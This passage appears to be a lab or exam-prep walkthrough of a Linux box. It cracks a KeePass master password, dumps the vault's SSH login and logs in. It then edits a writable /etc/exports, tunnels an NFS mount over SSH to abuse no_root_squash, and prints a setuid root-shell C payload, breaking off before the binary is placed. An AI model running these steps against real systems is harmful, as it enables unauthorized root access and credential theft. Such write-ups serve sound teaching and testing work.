+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13400</span><span class="w"> </span>keepass.hash<span class="w"> </span>--show
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>keys.kdbx:[redacted]
+</pre></div>
+<h3>2.3 Read the vault</h3>
+<p>KeePass stores entries as title / username / password. <code>pykeepass</code> opens the file with the recovered
+master password and lists them without a GUI:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span>-m<span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span>pykeepass
+python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">'from pykeepass import PyKeePass; \</span>
+<span class="s1">kp = PyKeePass("keys.kdbx", password="[redacted]"); \</span>
+<span class="s1">[print(e.title, "|", e.username, "|", e.password) for e in kp.entries]'</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>SSH | matt | [redacted]
+</pre></div>
+<p>One entry, and it is the one that matters: a username and a password for SSH.</p>
+<h3>2.4 Why this works, and when it will not</h3>
+<table>
+<thead>
+<tr>
+<th>Condition</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>a predictable master password</td>
+<td><code>rockyou.txt</code> recovers it in minutes</td>
+</tr>
+<tr>
+<td>KeePass 2 with default rounds</td>
+<td>slow per guess, but a dictionary word still falls</td>
+</tr>
+<tr>
+<td>a long passphrase master password</td>
+<td>this path ends here; the vault is not the way in</td>
+</tr>
+</tbody>
+</table>
+<p>The lesson is not "crack KeePass" — it is <strong>a backup share is a credential store</strong>. A vault copied
+into <code>Backup</code> turns nine folders of empty PDFs into one credential, and the rest of the box follows
+from it.</p>
+<hr />
+<p><strong>Next:</strong> <a href="#ch-03"><code>03-foothold.md</code></a></p></div></section>
+<section class="chapter" id="ch-03" data-title="SSH as matt"><div class="ch-head"><span class="ch-num">03</span><div class="ch-title"><h2>SSH as matt</h2><p class="ch-sub">The vault entry is a login · local.txt</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>The vault entry is an SSH login, and the host is listening on <code>22</code>.</p>
+<h3>3.1 Log in</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ssh<span class="w"> </span>matt@172.16.97.110
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>The authenticity of host '172.16.97.110' can't be established.
+ED25519 key fingerprint is SHA256:[redacted].
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+matt@172.16.97.110's password:
+Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-84-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+Last login: Thu Jul 20 21:58:14 2023 from 10.10.14.47
+</pre></div>
+<h3>3.2 Who am I</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>matt@oscp:~$<span class="w"> </span>id
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>uid=1000(matt) gid=1000(matt) groups=1000(matt),1001(adm)
+</pre></div>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>matt@oscp:~$<span class="w"> </span>hostname
+oscp
+matt@oscp:~$<span class="w"> </span>uname<span class="w"> </span>-a
+Linux<span class="w"> </span>oscp<span class="w"> </span><span class="m">5</span>.15.0-84-generic<span class="w"> </span>#93-Ubuntu<span class="w"> </span>SMP<span class="w"> </span>Tue<span class="w"> </span>Sep<span class="w"> </span><span class="m">5</span><span class="w"> </span><span class="m">12</span>:12:23<span class="w"> </span>UTC<span class="w"> </span><span class="m">2023</span><span class="w"> </span>x86_64<span class="w"> </span>x86_64<span class="w"> </span>x86_64<span class="w"> </span>GNU/Linux
+</pre></div>
+<p>A normal user with one supplementary group, on an up-to-date Ubuntu 22.04. The kernel is patched past
+most public local root exploits, so the escalation will not be a CVE — the group and the services
+matter more.</p>
+<h3>3.3 The user flag</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>matt@oscp:~$<span class="w"> </span>cat<span class="w"> </span>local.txt
+<span class="o">[</span>redacted<span class="o">]</span>
+</pre></div>
+<table>
+<thead>
+<tr>
+<th>Host</th>
+<th>File</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>172.16.97.110</code></td>
+<td><code>/home/matt/local.txt</code></td>
+<td><code>[redacted]</code></td>
+</tr>
+</tbody>
+</table>
+<p>User half done in four commands. The root half is the NFS export.</p>
+<h3>3.4 Before escalating: what to look at</h3>
+<p>On a Linux box with a shell, the checklist that matters is short:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>id<span class="w">                     </span><span class="c1"># groups, before anything else</span>
+sudo<span class="w"> </span>-l<span class="w">                </span><span class="c1"># what the account may run as root</span>
+ss<span class="w"> </span>-tuln<span class="w">               </span><span class="c1"># services that are only reachable locally</span>
+cat<span class="w"> </span>/etc/exports<span class="w">       </span><span class="c1"># NFS exports and their options</span>
+mount<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>nfs<span class="w">       </span><span class="c1"># what is already mounted</span>
+find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w">   </span>#<span class="w"> </span>SUID<span class="w"> </span>binaries
+</pre></div>
+<p><code>id</code> gave the group. <code>ss -tuln</code> shows <code>nfsd</code> and the Samba stack. <code>/etc/exports</code> is the file that
+ends the box — see the next chapter.</p>
+<hr />
+<p><strong>Next:</strong> <a href="#ch-04"><code>04-enumeration-nfs.md</code></a></p></div></section>
+<section class="chapter" id="ch-04" data-title="The export that ends the box"><div class="ch-head"><span class="ch-num">04</span><div class="ch-title"><h2>The export that ends the box</h2><p class="ch-sub">LinPEAS, /etc/exports, no_root_squash</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>A shell on the host is worth more than any port scan, because the file that decides the privilege
+escalation is only readable from inside.</p>
+<h3>4.1 What is listening</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>matt@oscp:~$<span class="w"> </span>ss<span class="w"> </span>-tuln
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>Netid State  Local Address:Port  Peer Address:Port
+udp   UNCONN 0.0.0.0:111         0.0.0.0:*
+udp   UNCONN 0.0.0.0:2049        0.0.0.0:*
+tcp   LISTEN 0.0.0.0:22          0.0.0.0:*
+tcp   LISTEN 0.0.0.0:111         0.0.0.0:*
+tcp   LISTEN 0.0.0.0:2049        0.0.0.0:*
+tcp   LISTEN 0.0.0.0:139         0.0.0.0:*
+tcp   LISTEN 0.0.0.0:445         0.0.0.0:*
+</pre></div>
+<p><code>2049</code> is NFS and <code>111</code> is <code>rpcbind</code>, the portmapper an NFSv3 client asks before it knows where
+<code>mountd</code> is. Both are worth a look from the outside, but the configuration that matters is a text
+file.</p>
+<h3>4.2 LinPEAS finds the line</h3>
+<p>An automated enumeration run reaches the NFS section quickly:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>matt@oscp:~$<span class="w"> </span>./linpeas.sh<span class="w"> </span>-a<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>linpeas.txt
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>╔══════════╣ Analyzing NFS Exports Files (Limit 70)
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
+/usr/upload localhost(rw,sync,no_root_squash)
+</pre></div>
+<p>One line, and it is the privilege escalation: a directory exported to <code>localhost</code> with
+<code>no_root_squash</code>. LinPEAS prints the export itself, not the permissions of <code>/etc/exports</code> — those are
+worth checking by hand, and they turn out to matter just as much (§4.6).</p>
+<h3>4.3 Read it directly</h3>
+<p>Automated output is a pointer, not the evidence. Confirm by hand:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>matt@oscp:~$<span class="w"> </span>cat<span class="w"> </span>/etc/exports
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>## /etc/exports: the access control list for filesystems which may be exported
+##               to NFS clients.  See exports(5).
+##
+## Example for NFSv2 and NFSv3:
+## /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+##
+## Example for NFSv4:
+## /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+## /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+##
+/usr/upload localhost(rw,sync,no_root_squash)
+</pre></div>
+<p>The stock comment block is untouched; the only live line is the last one. It does not yet carry
+<code>insecure</code> — that token is added in the next chapter, when the mount has to travel through a tunnel.</p>
+<h3>4.4 What <code>no_root_squash</code> does</h3>
+<p>NFS maps the client's users onto the server's users by UID. By default (<code>root_squash</code>) a request that
+arrives as UID 0 is rewritten to <code>nobody</code>, so a client's root cannot create root-owned files on the
+server.</p>
+<p><code>no_root_squash</code> turns that mapping off:</p>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Client UID 0 creates files owned by</th>
+<th>Consequence</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>root_squash</code> (default)</td>
+<td><code>nobody</code> / <code>nogroup</code></td>
+<td>a client root is harmless on the export</td>
+</tr>
+<tr>
+<td><code>no_root_squash</code></td>
+<td><code>root</code> (UID 0) on the server</td>
+<td>a client root writes files the server treats as its own</td>
+</tr>
+</tbody>
+</table>
+<p>That single difference is the whole escalation: place a binary on the export from a machine where you
+are root, set the SUID bit, and the server now holds a root-owned SUID binary.</p>
+<h3>4.5 What <code>localhost</code> and <code>insecure</code> do</h3>
+<p><code>localhost</code> is not "any client". It is the address the server sees as the source of the mount request,
+so only a mount that originates on the server itself matches the rule.</p>
+<p><code>insecure</code> relaxes the reserved-port requirement. NFS by default accepts requests only from source
+ports below 1024 (<code>secure</code>); a mount forwarded through an SSH tunnel arrives from an ephemeral port, so
+without <code>insecure</code> the server refuses it even though the address is now <code>127.0.0.1</code>.</p>
+<table>
+<thead>
+<tr>
+<th>Token</th>
+<th>Effect on this box</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>rw</code></td>
+<td>read and write on the export</td>
+</tr>
+<tr>
+<td><code>sync</code></td>
+<td>writes acknowledged after they are committed — no exploitation value</td>
+</tr>
+<tr>
+<td><code>no_root_squash</code></td>
+<td>client root keeps UID 0 on the server</td>
+</tr>
+<tr>
+<td><code>insecure</code></td>
+<td>not present yet; needed once the mount is tunnelled (chapter 05)</td>
+</tr>
+</tbody>
+</table>
+<h3>4.6 The other way in: the file is writable</h3>
+<p><code>matt</code> is in <code>adm</code>:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>matt@oscp:~$<span class="w"> </span>id
+<span class="nv">uid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>matt<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>matt<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>matt<span class="o">)</span>,1001<span class="o">(</span>adm<span class="o">)</span>
+</pre></div>
+<p>and <code>/etc/exports</code> is <code>-rw-rw-r-- root adm</code>. Group <code>adm</code> can write it, so <code>matt</code> can change the
+export options without <code>sudo</code> and without touching anything else on the host. That is why the box does
+not need a kernel exploit: the misconfiguration is editable by the account we already have.</p>
+<hr />
+<p><strong>Next:</strong> <a href="#ch-05"><code>05-mount-failures.md</code></a></p></div></section>
+<section class="chapter" id="ch-05" data-title="Why the direct mount is refused"><div class="ch-head"><span class="ch-num">05</span><div class="ch-title"><h2>Why the direct mount is refused</h2><p class="ch-sub">localhost, reserved ports, insecure</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>An NFS export with <code>no_root_squash</code> looks like a one-command win. From the exam network it is not:
+the mount is refused before any file is written.</p>
+<h3>5.1 The obvious attempt</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>kali@kali:~/exam$<span class="w"> </span>sudo<span class="w"> </span>mkdir<span class="w"> </span>-p<span class="w"> </span>/mnt/nfs
+kali@kali:~/exam$<span class="w"> </span>sudo<span class="w"> </span>mount<span class="w"> </span>-t<span class="w"> </span>nfs<span class="w"> </span><span class="m">172</span>.16.97.110:/usr/upload<span class="w"> </span>/mnt/nfs
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>mount.nfs: access denied by server while mounting 172.16.97.110:/usr/upload
+</pre></div>
+<p>The server answered — this is not a firewall drop, a timeout or a missing <code>nfs-common</code>. It parsed the
+request, compared the client against the export rule, and said no.</p>
+<h3>5.2 The rule is the reason</h3>
+<p>The export is:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>/usr/upload localhost(rw,sync,no_root_squash)
+</pre></div>
+<p><code>localhost</code> is matched against the source address of the mount request. From Kali that address is
+<code>10.10.14.47</code>, which is not <code>127.0.0.1</code>, so the server refuses the mount. The <code>no_root_squash</code> option
+never comes into play: the mount is rejected at the authorization step.</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>client 10.10.14.47  ──►  172.16.97.110:2049   source address ≠ localhost   ✗
+</pre></div>
+<p>This is also why scanning harder does not help. The port is open, the service is healthy, and the
+answer is a policy decision. More enumeration produces the same denial.</p>
+<h3>5.3 Attempts on the host itself</h3>
+<p>Mounting the export from the target to prove it works is a reasonable check, but the mount point has
+to exist and the options have to be valid:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>matt@oscp:~$<span class="w"> </span>mount<span class="w"> </span>-t<span class="w"> </span>nfs<span class="w"> </span><span class="m">127</span>.0.0.1:/usr/upload<span class="w"> </span>/home/matt/Desktop
+mount:<span class="w"> </span>/home/matt/Desktop:<span class="w"> </span>can<span class="err">'</span>t<span class="w"> </span>find<span class="w"> </span><span class="k">in</span><span class="w"> </span>/etc/fstab.
+</pre></div>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>matt@oscp:~$<span class="w"> </span>mount<span class="w"> </span>-t<span class="w"> </span>nfs<span class="w"> </span>-o<span class="w"> </span>rw<span class="w"> </span>localhost:/usr/upload<span class="w"> </span>/mnt
+mount.nfs:<span class="w"> </span>failed<span class="w"> </span>to<span class="w"> </span>apply<span class="w"> </span>fstab<span class="w"> </span>options
+</pre></div>
+<p>Both errors are local: a mount point that does not exist, and a helper that cannot apply the option
+string. Neither says anything about the export. On the host, <code>sudo mount -t nfs 127.0.0.1:/usr/upload
+/mnt/nfs</code> succeeds, because the source address really is <code>127.0.0.1</code> — a useful confirmation that the
+export itself is fine.</p>
+<h3>5.4 The missing option</h3>
+<p><code>insecure</code> is not cosmetic. Even once the request appears to come from <code>127.0.0.1</code>, NFS applies the
+reserved-port rule: a request must originate from a source port below 1024. A mount forwarded through
+an SSH tunnel leaves the client from an ephemeral port, so the server sees a high port and refuses
+under the default <code>secure</code> behaviour.</p>
+<p>The export file is writable by group <code>adm</code>, and <code>matt</code> is in <code>adm</code>, so the fix does not need root on
+the target. It does need care: <code>sed -i</code> writes a temporary file next to the original and renames it,
+which requires write permission on <code>/etc</code> itself — and <code>matt</code> does not have that. The content can be
+replaced, the inode cannot:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>matt@oscp:~$<span class="w"> </span>cp<span class="w"> </span>/etc/exports<span class="w"> </span>/tmp/exports
+matt@oscp:~$<span class="w"> </span>sed<span class="w"> </span>-i<span class="w"> </span><span class="s1">'s/no_root_squash)/no_root_squash,insecure)/'</span><span class="w"> </span>/tmp/exports
+matt@oscp:~$<span class="w"> </span>cat<span class="w"> </span>/tmp/exports<span class="w"> </span>&gt;<span class="w"> </span>/etc/exports
+matt@oscp:~$<span class="w"> </span>tail<span class="w"> </span>-n<span class="w"> </span><span class="m">1</span><span class="w"> </span>/etc/exports
+/usr/upload<span class="w"> </span>localhost<span class="o">(</span>rw,sync,no_root_squash,insecure<span class="o">)</span>
+</pre></div>
+<p><code>cat &gt; file</code> truncates and writes the existing inode, so file write permission is enough. The same
+edit attempted as <code>sed -i /etc/exports</code> fails with
+<code>sed: couldn't open temporary file /etc/sedXXXXXX: Permission denied</code>, even though the file itself is
+writable.</p>
+<p>The export table is rebuilt from the file when it changes, so no service restart or <code>exportfs</code> call
+is needed — and <code>matt</code> could not run one anyway.</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>-rw-rw-r-- 1 root adm 404 Jul 21 20:11 /etc/exports
+</pre></div>
+<p>The modification time records the edit. Nothing else on the host was modified to make the
+escalation work.</p>
+<h3>5.5 What the failures teach</h3>
+<table>
+<thead>
+<tr>
+<th>Symptom</th>
+<th>Wrong conclusion</th>
+<th>Actual cause</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>access denied by server</code></td>
+<td>firewall, wrong port, bad <code>nfs-common</code></td>
+<td>source address does not match <code>localhost</code></td>
+</tr>
+<tr>
+<td><code>can't find in /etc/fstab</code></td>
+<td>the export is broken</td>
+<td>the mount point does not exist on the client</td>
+</tr>
+<tr>
+<td><code>failed to apply fstab options</code></td>
+<td>unsupported NFS version</td>
+<td>malformed option string on the command line</td>
+</tr>
+<tr>
+<td>works on the host, fails from Kali</td>
+<td>the export is read-only</td>
+<td>same address rule, different source</td>
+</tr>
+</tbody>
+</table>
+<p>The box is not defended by a patch. It is defended by an address restriction that a tunnel satisfies
+and by a port rule that one extra option disables.</p>
+<hr />
+<p><strong>Next:</strong> <a href="#ch-06"><code>06-tunnel-and-mount.md</code></a></p></div></section>
+<section class="chapter" id="ch-06" data-title="Through the tunnel"><div class="ch-head"><span class="ch-num">06</span><div class="ch-title"><h2>Through the tunnel</h2><p class="ch-sub">ssh -L 2049 and a loopback mount</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>The export only answers <code>localhost</code>. The way to become <code>localhost</code> is not to spoof an address but to
+let the target make the connection to itself — with an SSH forward carrying it.</p>
+<h3>6.1 The idea</h3>
+<p>An SSH local forward opens a listening port on the client and, for every connection it receives,
+opens a matching connection <strong>from the SSH server</strong>. The server-side connection originates on the
+server, so its source address is <code>127.0.0.1</code> as far as the NFS daemon is concerned.</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>kali 127.0.0.1:2049  ──ssh──►  oscp 127.0.0.1:2049
+      (mount runs here)         (rpc.nfsd sees a local client)
+</pre></div>
+<p>Two details make it work:</p>
+<table>
+<thead>
+<tr>
+<th>Detail</th>
+<th>Why it matters</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>localhost</code> in <code>-L</code> is resolved <strong>on the server</strong></td>
+<td>the forward terminates on the target's loopback, not on Kali's</td>
+</tr>
+<tr>
+<td>the tunnel's server-side socket uses an ephemeral port</td>
+<td>the export needs <code>insecure</code>, added in the previous chapter</td>
+</tr>
+</tbody>
+</table>
+<h3>6.2 Open the forward</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>kali@kali:~/exam$<span class="w"> </span>ssh<span class="w"> </span>-L<span class="w"> </span><span class="m">2049</span>:localhost:2049<span class="w"> </span>matt@172.16.97.110
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>matt@172.16.97.110's password:
+Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-84-generic x86_64)
+...
+matt@oscp:~$
+</pre></div>
+<p>Leave this session open. It is the transport for the mount, not just a shell.</p>
+<p><code>-L 2049:localhost:2049</code> reads as <em>local port : destination host : destination port</em>. The destination
+host is evaluated by <code>sshd</code> on the target, which is why the export sees a loopback client.</p>
+<p>Binding port <code>2049</code> locally is below 1024; Kali allows unprivileged low-port binds
+(<code>net.ipv4.ip_unprivileged_port_start=0</code>), so the forward does not need <code>sudo</code>. On a host that keeps
+the default limit of 1024, use the high-port variant in §6.5.</p>
+<h3>6.3 Mount through loopback</h3>
+<p>In a second terminal on Kali:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>kali@kali:~/exam$<span class="w"> </span>sudo<span class="w"> </span>mkdir<span class="w"> </span>-p<span class="w"> </span>/mnt/nfs
+kali@kali:~/exam$<span class="w"> </span>sudo<span class="w"> </span>mount<span class="w"> </span>-t<span class="w"> </span>nfs<span class="w"> </span><span class="m">127</span>.0.0.1:/usr/upload<span class="w"> </span>/mnt/nfs
+kali@kali:~/exam$<span class="w"> </span>mount<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>/mnt/nfs
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>127.0.0.1:/usr/upload on /mnt/nfs type nfs4 (rw,relatime,vers=4.2,rsize=1048576,wsize=1048576,namlen=255,hard,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=127.0.0.1,local_lock=none,addr=127.0.0.1)
+</pre></div>
+<p>No <code>access denied</code>. The path in the mount table says <code>127.0.0.1:/usr/upload</code>, but every byte of that
+traffic is travelling to <code>172.16.97.110</code> inside the SSH session and arriving on its loopback
+interface.</p>
+<p><code>type nfs4</code> is what makes a single forwarded port sufficient. NFSv4 carries the mount protocol inside
+the same connection on <code>2049</code>; it has no separate <code>rpcbind</code> or <code>mountd</code> lookup. An NFSv3 mount would
+first ask the portmapper on <code>111</code> where <code>mountd</code> lives, and neither port is forwarded here — the mount
+would fail even with <code>insecure</code> set. If a server only offers v3, forward <code>111</code> and <code>20048</code> as well and
+mount with <code>-o vers=3</code>.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>kali@kali:~/exam$<span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span>/mnt/nfs
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>total 8
+drwxr-xr-x 2 root root 4096 Jul 21 20:11 .
+drwxr-xr-x 1 root root 4096 Jul 21 20:12 ..
+</pre></div>
+<p>The directory is empty and owned by <code>root</code> — the same directory the target sees as <code>/usr/upload</code>.</p>
+<h3>6.4 Why the two failures are gone</h3>
+<table>
+<thead>
+<tr>
+<th>Previous failure</th>
+<th>What changed</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>access denied by server</code></td>
+<td>the request now originates from the target's <code>127.0.0.1</code>, matching <code>localhost</code></td>
+</tr>
+<tr>
+<td>high source port rejected</td>
+<td><code>insecure</code> was added to the export line</td>
+</tr>
+</tbody>
+</table>
+<p>Both conditions are required. A tunnel without <code>insecure</code> still fails the port check; <code>insecure</code>
+without a tunnel still fails the address check.</p>
+<h3>6.5 If port 2049 is already taken locally</h3>
+<p>Binding <code>2049</code> on Kali fails if another NFS client or a previous tunnel still holds it. Any local port
+works as long as the mount is told which one to use:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>kali@kali:~/exam$<span class="w"> </span>ssh<span class="w"> </span>-L<span class="w"> </span><span class="m">3049</span>:localhost:2049<span class="w"> </span>matt@172.16.97.110
+kali@kali:~/exam$<span class="w"> </span>sudo<span class="w"> </span>mount<span class="w"> </span>-t<span class="w"> </span>nfs<span class="w"> </span>-o<span class="w"> </span><span class="nv">port</span><span class="o">=</span><span class="m">3049</span><span class="w"> </span><span class="m">127</span>.0.0.1:/usr/upload<span class="w"> </span>/mnt/nfs
+</pre></div>
+<p><code>-o port=3049</code> changes the destination port the client dials; the SSH forward rewrites it to <code>2049</code> on
+the target.</p>
+<h3>6.6 Keep the session, and unmount first</h3>
+<p>The mount is <code>hard</code> by default: if the SSH session dies, every process touching <code>/mnt/nfs</code> blocks in
+uninterruptible I/O until the mount is removed. In order:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>kali@kali:~/exam$<span class="w"> </span>sudo<span class="w"> </span>umount<span class="w"> </span>/mnt/nfs
+kali@kali:~/exam$<span class="w"> </span><span class="nb">exit</span><span class="w">          </span>#<span class="w"> </span>close<span class="w"> </span>the<span class="w"> </span>SSH<span class="w"> </span>session<span class="w"> </span>last
+</pre></div>
+<p>For lab work a <code>soft</code> mount with a short timeout avoids a wedged terminal, at the cost of I/O errors
+instead of retries:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>kali@kali:~/exam$<span class="w"> </span>sudo<span class="w"> </span>mount<span class="w"> </span>-t<span class="w"> </span>nfs<span class="w"> </span>-o<span class="w"> </span>soft,timeo<span class="o">=</span><span class="m">50</span>,retrans<span class="o">=</span><span class="m">1</span><span class="w"> </span><span class="m">127</span>.0.0.1:/usr/upload<span class="w"> </span>/mnt/nfs
+</pre></div>
+<p>The export is now writable from a machine where we are root. That is the last precondition.</p>
+<hr />
+<p><strong>Next:</strong> <a href="#ch-07"><code>07-suid-root.md</code></a></p></div></section>
+<section class="chapter" id="ch-07" data-title="A root-owned SUID binary"><div class="ch-head"><span class="ch-num">07</span><div class="ch-title"><h2>A root-owned SUID binary</h2><p class="ch-sub">shell.c, chmod +s, proof.txt</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p><code>no_root_squash</code> means a file written to the export by Kali's root is owned by the target's root. Add
+the SUID bit and the target has a root binary that any local user can run.</p>
+<h3>7.1 The payload</h3>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="w">    </span><span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="w">    </span><span class="n">system</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p><code>setuid(0)</code> and <code>setgid(0)</code> set the <strong>real</strong> IDs as well as the effective ones. With the SUID bit the
+effective UID is already 0; setting the real UID makes the shell start as root in every respect, which
+avoids a shell that reports <code>uid=0</code> but cannot read <code>/root</code>.</p>
+<h3>7.2 Compile</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>kali@kali:~/exam$<span class="w"> </span>gcc<span class="w"> </span>shell.c<span class="w"> </span>-o<span class="w"> </span>shell
+kali@kali:~/exam$<span class="w"> </span>file<span class="w"> </span>shell
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>shell: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=[redacted], for GNU/Linux 3.2.0, not stripped
+</pre></div>
+<p>It must be compiled for the target's architecture — <code>x86-64</code> here, matching the Ubuntu host.</p>
+<h3>7.3 Place it on the export as root</h3>
